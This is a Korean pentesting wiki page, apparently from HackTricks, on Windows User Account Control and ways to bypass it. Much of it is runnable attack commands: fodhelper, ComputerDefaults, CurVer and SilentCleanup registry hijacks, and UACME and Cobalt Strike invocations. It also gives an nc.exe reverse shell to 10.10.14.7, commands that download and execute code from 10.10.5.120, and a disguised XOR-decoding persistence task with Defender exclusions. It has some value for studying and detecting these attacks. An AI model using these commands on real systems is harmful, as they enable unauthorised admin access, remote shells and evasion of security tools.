# UAC - 사용자 계정 컨트롤

{{#include ../../banners/hacktricks-training.md}}

## UAC

[사용자 계정 컨트롤(User Account Control, UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승 작업에 대한 동의 프롬프트**를 표시하는 기능입니다. 애플리케이션마다 `integrity` 수준이 다르며, **높은 수준**의 프로그램은 **시스템을 손상시킬 가능성이 있는 작업**을 수행할 수 있습니다. UAC가 활성화되어 있으면 관리자가 애플리케이션/작업에 시스템에 대한 관리자 수준 액세스 권한을 명시적으로 부여하지 않는 한, 애플리케이션과 작업은 항상 **관리자가 아닌 계정의 보안 컨텍스트에서 실행됩니다**. 이 기능은 의도하지 않은 변경으로부터 관리자를 보호하는 편의 기능이지만 보안 경계로 간주되지 않습니다.<sup>[[2]](#references)</sup>

무결성 수준에 대한 자세한 내용은 다음을 참조하세요.


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC가 적용되면 관리자 사용자에게 토큰 2개가 제공됩니다. 일반 작업을 중간 무결성 수준에서 수행하기 위한 표준 사용자 토큰과 관리자 권한이 있는 토큰입니다.

이 [페이지](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)에서는 UAC의 작동 방식을 자세히 설명하며 로그온 프로세스, 사용자 경험, UAC 아키텍처를 다룹니다.<sup>[[2]](#references)</sup> 관리자는 보안 정책을 사용해 로컬 수준(secpol.msc 사용)에서 조직에 맞게 UAC 작동 방식을 구성하거나, Active Directory 도메인 환경에서 Group Policy Objects (GPO)를 통해 구성하고 배포할 수 있습니다. 다양한 설정에 대한 자세한 내용은 [여기](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)를 참조하세요. UAC에 대해 설정할 수 있는 Group Policy 설정은 10개입니다. 다음 표에서 자세히 확인할 수 있습니다.

| Group Policy 설정                                                                                                                                                                                                                                                                                                                                                           | 레지스트리 키                | 기본 설정                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [사용자 계정 컨트롤: 기본 제공 Administrator 계정에 대한 Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (사용 안 함)                                             |
| [사용자 계정 컨트롤: Admin Approval Mode에서 관리자의 권한 상승 프롬프트 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (보안 데스크톱에서 Windows 이외의 바이너리에 대해 동의 프롬프트 표시) |
| [사용자 계정 컨트롤: 표준 사용자의 권한 상승 프롬프트 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (보안 데스크톱에서 자격 증명 입력 프롬프트 표시)         |
| [사용자 계정 컨트롤: 애플리케이션 설치를 감지하고 권한 상승 프롬프트 표시](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (사용; Enterprise에서는 기본적으로 사용 안 함)           |
| [사용자 계정 컨트롤: 서명 및 유효성 검사가 완료된 실행 파일만 권한 상승 허용](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (사용 안 함)                                             |
| [사용자 계정 컨트롤: 보안 위치에 설치된 UIAccess 애플리케이션만 권한 상승 허용](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (사용)                                              |
| [사용자 계정 컨트롤: 모든 관리자를 Admin Approval Mode로 실행](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (사용)                                              |
| [사용자 계정 컨트롤: UIAccess 애플리케이션이 보안 데스크톱을 사용하지 않고 권한 상승 프롬프트를 표시하도록 허용](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (사용 안 함)                                             |
| [사용자 계정 컨트롤: 권한 상승 프롬프트를 표시할 때 보안 데스크톱으로 전환](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (사용)                                              |
| [사용자 계정 컨트롤: 파일 및 레지스트리 쓰기 실패를 사용자별 위치로 가상화](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (사용)                                              |

### Windows에 소프트웨어를 설치하기 위한 정책

**로컬 보안 정책**(대부분의 시스템에서 "secpol.msc")은 기본적으로 **관리자가 아닌 사용자가 소프트웨어를 설치하지 못하도록** 설정되어 있습니다. 즉, 관리자가 아닌 사용자가 소프트웨어 설치 프로그램을 다운로드할 수 있더라도 관리자 계정 없이는 실행할 수 없습니다.

### UAC가 권한 상승을 요청하도록 설정하는 레지스트리 키

관리자 권한이 없는 표준 사용자라면, "표준" 계정이 특정 작업을 수행하려 할 때 UAC에서 **자격 증명 입력을 요청하도록** 설정할 수 있습니다. 이 작업에는 특정 **레지스트리 키**를 수정해야 하며, **UAC bypass**가 있거나 공격자가 이미 관리자로 로그인한 경우가 아니라면 관리자 권한이 필요합니다.

사용자가 **Administrators** 그룹에 속해 있더라도, 이러한 변경을 적용하면 관리 작업을 수행하기 위해 **계정 자격 증명을 다시 입력해야 합니다**.

**실제로는 이미 상승된 토큰이나 UAC bypass가 있거나, 이러한 키를 변경할 수 있는 잘못된 구성이 있는 경우에만 유용합니다. 그렇지 않으면 레지스트리 쓰기 자체가 차단됩니다.**

변경해야 할 레지스트리 키와 항목은 다음과 같습니다(괄호 안은 기본값).

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Local Security Policy 도구를 통해 수동으로 변경할 수도 있습니다. 변경한 뒤에는 관리 작업을 수행할 때 사용자에게 자격 증명을 다시 입력하라는 프롬프트가 표시됩니다.

### 참고

**User Account Control은 보안 경계가 아닙니다.** 따라서 표준 사용자는 로컬 권한 상승 exploit 없이는 자신의 계정에서 벗어나 관리자 권한을 획득할 수 없습니다.

### 사용자에게 '컴퓨터 전체 액세스' 요청하기

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC 권한

- Internet Explorer Protected Mode는 무결성 검사를 사용해 높은 무결성 수준의 프로세스(예: 웹 브라우저)가 낮은 무결성 수준의 데이터(예: 임시 인터넷 파일 폴더)에 접근하지 못하도록 합니다. 브라우저를 낮은 무결성 토큰으로 실행해 이를 구현합니다. 브라우저가 낮은 무결성 영역에 저장된 데이터에 접근하려고 하면 운영 체제는 프로세스의 무결성 수준을 확인하고 이에 따라 접근을 허용합니다. 이 기능은 remote code execution 공격이 시스템의 민감한 데이터에 접근하지 못하도록 방지하는 데 도움이 됩니다.
- 사용자가 Windows에 로그인하면 시스템은 사용자의 권한 목록이 포함된 액세스 토큰을 생성합니다. 권한은 사용자의 권리와 기능을 조합한 것입니다. 토큰에는 사용자의 자격 증명 목록도 포함됩니다. 이 자격 증명은 사용자를 컴퓨터와 네트워크 리소스에 인증하는 데 사용됩니다.

### Autoadminlogon

시작할 때 특정 사용자로 Windows에 자동 로그인하도록 구성하려면 **`AutoAdminLogon` 레지스트리 키**를 설정합니다. 키오스크 환경이나 테스트 목적으로 유용합니다. 레지스트리에 암호가 노출되므로 보안이 유지되는 시스템에서만 사용하세요.

Registry Editor 또는 `reg add`를 사용해 다음 키를 설정합니다.

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

일반 로그인 동작으로 되돌리려면 `AutoAdminLogon`을 0으로 설정합니다.

## UAC bypass

> [!TIP]
> 피해자 시스템에 그래픽으로 접근할 수 있다면 UAC 프롬프트가 나타났을 때 "Yes"를 클릭하면 되므로 UAC bypass는 간단합니다.

UAC bypass는 다음과 같은 상황에서 필요합니다. **UAC가 활성화되어 있고, 프로세스가 medium integrity 컨텍스트에서 실행 중이며, 사용자 계정이 administrators 그룹에 속해 있습니다.**

UAC가 가장 높은 보안 수준(Always)으로 설정되어 있으면 다른 수준(Default)으로 설정된 경우보다 **bypass하기가 훨씬 더 어렵습니다.**

### medium-integrity 셸에서 빠르게 상황 파악하기

bypass를 시도하기 전에 올바른 상황인지 확인하고, 호스트 빌드에 맞는 알려진 작동 방법을 파악합니다:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

실용적인 참고 사항:
- `EnableLUA=0`이면 bypass가 필요하지 않습니다. 모든 admin token이 high integrity를 직접 요청할 수 있습니다.
- `ConsentPromptBehaviorAdmin=2` 또는 `5`는 auto-elevate / COM-based bypasses에서 흔히 나타나는 시나리오입니다.
- `Always Notify`는 기준을 높이지만, 실패를 단정하지 말고 정확한 빌드에서 테스트해야 합니다. UACME는 최신 Windows 빌드에서 `AlwaysNotify compatible` 메서드 일부를 여전히 추적합니다.<sup>[[3]](#references)</sup>

### UAC 비활성화

UAC가 이미 비활성화되어 있다면 (`ConsentPromptBehaviorAdmin`이 **`0`**), 다음과 같은 방법으로 **admin 권한으로 reverse shell을 실행할 수 있습니다** (high integrity level):

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC token duplication을 통한 우회

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + 재사용 가능한 debug object

AppInfo local RPC 인터페이스 `201ef99a-7fa0-444c-9399-19ba84f12a1a`는 debugging이 활성화된 프로세스를 생성할 수 있습니다. 같은 스레드에서 debug를 통해 생성된 프로세스는 해당 스레드의 debug object를 공유합니다. 생성 debug 이벤트에는 RPC 결과 자체가 제한된 access만 제공하는 경우에도 full-access process handle이 포함됩니다. 이를 통해 Administrators 그룹에 속한 medium-integrity 사용자는 debug-object 재사용을 UAC primitive로 활용할 수 있습니다.<sup>[[11]](#references)[[12]](#references)</sup>

실제 공격 흐름은 다음과 같습니다.<sup>[[11]](#references)[[12]](#references)</sup>

1. local RPC method를 호출해(직접 또는 `NdrAsyncClientCall` 사용) debugging이 활성화된 비-elevated 임시 프로세스를 생성합니다.
2. `NtQueryInformationProcess`로 `ProcessDebugObjectHandle`을 조회하고, `NtRemoveProcessDebug`로 분리한 뒤 해당 object를 보관하고 임시 프로세스를 종료합니다.
3. 같은 RPC 인터페이스를 사용해 신뢰된 auto-elevated 프로세스를 생성한 다음, `DbgUiSetThreadDebugObject`를 통해 저장한 object를 호출 스레드에 연결합니다.
4. `WaitForDebugEvent`를 호출하고 `CREATE_PROCESS_DEBUG_EVENT` process handle을 가져온 뒤, 계속 진행하기 전에 `NtDuplicateObject`로 복제합니다.
5. 복제한 handle을 `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)`에 전달하고 확장된 startup-info 구조체를 사용해 payload를 실행합니다. 이렇게 하면 elevated 프로세스 컨텍스트를 재사용하면서 자식 프로세스에 신뢰된 것처럼 보이는 parent 관계도 설정할 수 있습니다.

auto-elevated 바이너리만 찾지 말고 짧은 동작 시퀀스를 탐지하세요. local AppInfo RPC를 통한 프로세스 생성, `ProcessDebugObjectHandle` 조회, debugger 분리/재연결, 즉각적인 생성 debug 이벤트, handle 복제, 그리고 기록된 parent가 생성 API를 호출한 프로세스와 일치하지 않는 자식 프로세스를 찾으면 됩니다.<sup>[[12]](#references)</sup>

### **아주** 기본적인 UAC "우회" (전체 파일 시스템 접근)

Administrators 그룹에 속한 사용자의 shell을 가지고 있다면, SMB를 통해 공유된 **C$를 새 디스크에 로컬로 mount**할 수 있으며, 그러면 **파일 시스템의 모든 항목에 접근**할 수 있습니다(Administrator 홈 폴더 포함).

> [!WARNING]
> **이 방법은 더 이상 작동하지 않는 것 같습니다**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Cobalt Strike를 이용한 UAC bypass

UAC가 최대 보안 수준으로 설정되어 있지 않은 경우에만 Cobalt Strike 기법이 작동합니다.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire**와 **Metasploit**에는 **UAC**를 **우회**하는 여러 모듈도 있습니다.

### 상승된 COM 인터페이스 (`ICMLuaUtil` / `CMSTPLUA`)

자동 상승 COM 객체는 최신 빌드에서도 여전히 실용적인 UAC 공격 표면입니다. UACME는 현재 Windows 브랜치에서도 `ICMLuaUtil`이 작동하는 것으로 추적하고 있으며, 공격 도구는 대화형 데스크톱 프로세스, 64비트 실행, 때로는 COM Elevation Moniker를 호출하기 전의 PEB/프로세스 가장을 조합해 `CMSTPLUA`를 계속 적용하고 있습니다.<sup>[[3]](#references)</sup>

실전 팁:
- 사용자의 **대화형 세션**에서 실행되는 **64비트** 프로세스를 우선 사용하세요(일반적으로 `explorer.exe` 또는 그 자식 프로세스).
- 일반 셸이 실패하면 단순한 `CreateProcess` 래퍼 대신 BOF / UACME 구현으로 다시 시도하세요.
- 자식 프로세스는 **별도의 상승된 프로세스**에서 실행될 수 있습니다. 많은 BOF는 현재 비콘 자체를 제자리에서 상승시키지 않습니다.

### KRBUACBypass

문서와 도구: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC 우회 익스플로잇

[**UACME**](https://github.com/hfiref0x/UACME)는 UAC 우회 기법 모음입니다. Visual Studio 또는 MSBuild로 컴파일하세요. 빌드하면 여러 실행 파일이 생성되므로(예: `Source\Akagi\output\x64\Debug\Akagi.exe`), 대상 빌드에 적합한 방법을 선택하세요.<sup>[[3]](#references)</sup>\
주의하세요. 일부 우회 기법은 사용자에게 경고가 될 수 있는 프로그램이나 프롬프트를 표시합니다.<sup>[[3]](#references)</sup>

UACME에는 각 기법이 작동하기 시작한 **빌드 버전**이 나와 있습니다.<sup>[[3]](#references)</sup> 사용 중인 버전에 영향을 주는 기법을 검색할 수 있습니다:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

또한 [이 페이지](https://en.wikipedia.org/wiki/Windows_10_version_history)를 사용하면 빌드 버전에서 Windows 릴리스 `1607`을 확인할 수 있습니다.

실용적인 워크플로는 먼저 **호스트 빌드의 점수를 매긴 다음**, 이에 맞는 방법을 실행하는 것입니다:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage`는 로컬 빌드를 알려진 UAC 메서드와 빠르게 비교하므로, 더 이상 작동하지 않는 PoC를 신속히 제외하는 데 유용합니다.<sup>[[4]](#references)</sup>
- `UACME`는 bypass를 정확한 빌드에 대응시키는 데 여전히 가장 유용한 공개 카탈로그입니다. 버전 3.7.1에서는 메서드 83–85가 추가되었으며, 직전 릴리스에서는 기존 메서드를 **Windows 11 25H2**에서 다시 테스트했습니다. 오래된 PoC가 변경 없이 여전히 적용된다고 가정하지 말고 메서드 표와 릴리스 노트를 다시 확인하세요.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify와 호환되는 WNF/UIAccess 체인 (UACME 3.7.1)

`Always Notify`가 모든 UAC bypass를 막는 것은 아닙니다. UACME 3.7.1에는 사용자 제어 환경 변수/프로토콜 상태와 권한이 상승된 예약 작업 또는 UIAccess 동작을 결합하는 세 가지 새로운 x64 메서드가 구현되어 있으며, 모두 `AlwaysNotify compatible`로 표시되어 있습니다.<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot`를 리디렉션하여 WNF가 트리거하는 `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`에서 권한이 상승된 `taskhostw.exe`가 `unifiedconsent.dll`을 사이드로드하도록 합니다. UACME는 Windows 10 build 19041부터 이 메서드를 추적합니다.
- **84 — TabTip:** 동일한 환경 변수 프리미티브를 UIAccess `TabTip.exe`에 적용합니다. 이 프로그램은 빌드에 따라 `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` 또는 `rsaenh.dll`을 로드한 다음, 그 결과로 얻은 높은 무결성 수준의 UIAccess 컨텍스트에서 다음 단계로 진행합니다. UACME는 Windows 8.1 / Server 2016부터 이 메서드를 추적합니다.
- **85 — Narrator:** 사용자별 `feedback-hub` 프로토콜을 하이재킹하고, `Alt+CapsLock+F`로 Narrator를 실행한 다음, `OskSupport.dll`을 사이드로드하는 쓰기 가능한 `osk.exe` 복사본을 실행합니다. 대화형 데스크톱이 필요하며, Windows 10 1809 / Server 2019부터 추적됩니다.

UACME 문서에 따라 payload unit과 Akagi를 빌드한 후, 해당 메서드 번호를 지정해 실행합니다 (선택적 명령은 기본적으로 `cmd.exe`입니다):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

방법 84와 85는 UIAccess/데스크톱 상호작용에 의존하므로 Session 0 또는 비대화형 서비스 셸에서 그대로 작동할 것으로 기대하지 마세요. 세 방법 모두 환경/프로토콜 상태를 조작하고 DLL을 배치합니다. 테스트 후 구현을 검사하고 해당 아티팩트를 제거하세요.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC 우회 – fodhelper.exe (레지스트리 하이재킹)

신뢰할 수 있는 바이너리인 `fodhelper.exe`는 최신 Windows에서 자동으로 권한이 상승됩니다. 실행되면 아래의 사용자별 레지스트리 경로를 `DelegateExecute` 동사의 유효성을 검사하지 않고 조회합니다. 해당 위치에 명령을 심으면 Medium Integrity 프로세스(사용자가 Administrators 그룹에 속함)가 UAC 프롬프트 없이 High Integrity 프로세스를 생성할 수 있습니다.

fodhelper가 조회하는 레지스트리 경로:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell 단계 (payload를 설정한 다음 실행)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
참고:
- 현재 사용자가 Administrators 그룹의 구성원이고 UAC 수준이 기본값/완화 상태일 때 동작합니다(추가 제한이 적용된 Always Notify는 해당하지 않음).
- 64비트 Windows에서 32비트 프로세스로부터 64비트 PowerShell을 시작하려면 `sysnative` 경로를 사용합니다.
- Payload는 어떤 명령이든 가능합니다(PowerShell, cmd 또는 EXE 경로). stealth를 위해 프롬프트 UI는 피하세요.

#### 같은 `ms-settings` handler의 `ComputerDefaults.exe` trigger

`ComputerDefaults.exe`는 `fodhelper.exe`와 동일한 사용자별 `ms-settings\Shell\Open\command` 연결을 확인합니다.<sup>[[13]](#references)[[14]](#references)</sup> 위에서 기본 명령과 빈 `DelegateExecute` 값을 설정한 후, 대체 trigger로 `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"`를 사용하세요. 레지스트리 설정을 반복하지 마세요.<sup>[[13]](#references)[[14]](#references)</sup> 위의 `fodhelper.exe` 참고 사항에 있는 medium-integrity administrator 및 UAC 정책의 전제 조건도 여전히 적용됩니다.<sup>[[2]](#references)[[3]](#references)</sup> UACME에는 Windows 10 RS4 (build 17134)부터 이 trigger가 수록되어 있으므로 대상 빌드에서 확인하세요.<sup>[[3]](#references)</sup>

#### CurVer/extension hijack 변형 (HKCU only)

최근 `fodhelper.exe`를 악용하는 샘플은 `DelegateExecute`를 사용하지 않고, 사용자별 `CurVer` 값을 통해 **`ms-settings` ProgID를 redirect**합니다. auto-elevated binary는 여전히 `HKCU`의 handler를 확인하므로, 키를 만들 때 admin token이 필요하지 않습니다:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

권한 상승 후 malware는 흔히 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin`을 `0`으로 설정해 **향후 프롬프트를 비활성화**한 다음, 추가적인 방어 회피(예: `Add-MpPreference -ExclusionPath C:\ProgramData`)를 수행하고 높은 무결성 수준으로 실행되도록 persistence를 다시 생성합니다. 일반적인 persistence 작업은 **XOR로 암호화된 PowerShell 스크립트**를 디스크에 저장한 뒤 매시간 메모리에서 디코딩하고 실행합니다:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

이 variant는 여전히 dropper를 정리하고 staged payloads만 남기므로, 탐지는 **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` 변조, Defender exclusion 생성 또는 메모리에서 PowerShell을 복호화하는 scheduled tasks 모니터링에 의존하게 됩니다.<sup>[[5]](#references)</sup>

### `SilentCleanup` task를 통한 UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`은 `cleanmgr.exe`를 최고 권한으로 실행하고 사용자 환경 변수의 `%windir%`를 확장합니다. `HKCU\Environment\windir`를 제어할 수 있다면, 해당 확장을 임의의 명령으로 리디렉션하여 consent dialog 없이 높은 무결성 수준을 얻을 수 있습니다.<sup>[[8]](#references)</sup> UACME에서 이 기법이 계속 활성화되어 있고, 최근 이슈 추적에 따르면 Windows 11 24H2에서는 인용 부호를 약간 조정하는 것만으로 충분할 수 있으므로 최신 빌드에서도 여전히 테스트해 볼 가치가 있습니다.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

해당 빌드에서 작업이 경로를 따옴표로 감싼다면, 페이로드 끝에 따옴표를 붙여 다시 시도하세요(예: `cmd.exe"`). 테스트 후에는 항상 `HKCU\Environment\windir`를 정리하세요.

#### More UAC bypass

UI 흐름, COM objects 또는 데스크톱 상호작용을 악용하는 여러 고전적인 UAC bypass는 피해자의 **완전한 대화형 세션**이 필요합니다. 일반적인 `nc.exe` shell이나 **Session 0**에서 실행되는 service만으로는 부족한 경우가 많습니다.

대개 **meterpreter** 세션으로 이 문제를 해결할 수 있습니다. **Session** 값이 **1**인 **process**로 마이그레이션하세요:

![ms-settings를 사용자 지정 확장자(.thm)로 지정하고 해당 확장자를 페이로드에 매핑 - More UAC bypass: meterpreter 세션을 사용하면 가능합니다. Session...](<../../images/image (863).png>)

(_explorer.exe_가 작동해야 합니다)

### GUI를 이용한 UAC Bypass

**GUI에 접근할 수 있다면 UAC prompt가 나타날 때 수락하면 됩니다**. 기술적인 bypass는 실제로 필요하지 않습니다. 따라서 GUI 세션을 얻는 것만으로도 UAC가 추가하는 실질적인 제약을 우회하기에 충분한 경우가 많습니다.

또한 누군가 사용 중이던 GUI 세션(예: RDP를 통한 세션)을 얻으면, **administrator 권한으로 실행 중인 도구**가 있을 수 있습니다. 그런 도구에서 UAC prompt가 다시 나타나지 않도록 **cmd** 등을 **admin 권한으로 직접 실행**할 수 있습니다. 예를 들면 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)가 있습니다. 이 방법이 조금 더 **stealthy**할 수 있습니다.

### 시끄러운 brute-force UAC bypass

소음이 문제가 되지 않는다면 [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) 같은 도구로 사용자가 수락할 때까지 권한 상승을 반복해서 요청할 수 있습니다.

### 직접 만드는 bypass - 기본 UAC bypass 방법론

**UACME**를 살펴보면 **많은 UAC bypass가 DLL hijacking을 악용한다는 점**을 알 수 있습니다(대개 권한이 상승된 binary가 공격자가 제어하는 DLL을 쓰기 가능한 경로에서 로드하도록 합니다). [DLL hijacking 취약점을 찾는 방법은 여기서 확인하세요](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate**되는 binary를 찾습니다(실행 시 높은 integrity level로 실행되는지 확인).
2. procmon으로 **DLL Hijacking**에 취약할 수 있는 "**NAME NOT FOUND**" 이벤트를 찾습니다.
3. 쓰기 권한이 없는 **보호된 경로**(예: C:\Windows\System32)에 DLL을 **작성**해야 할 수 있습니다. 다음 방법으로 우회할 수 있습니다:
   1. **wusa.exe**: Windows 7, 8, 8.1에서 사용할 수 있습니다. 이 도구는 높은 integrity level로 실행되므로 CAB file의 내용을 보호된 경로에 추출할 수 있습니다.
   2. **IFileOperation**: Windows 10.
4. DLL을 보호된 경로에 복사하고 취약한 autoelevated binary를 실행하는 **script**를 준비합니다.

### 또 다른 UAC bypass technique

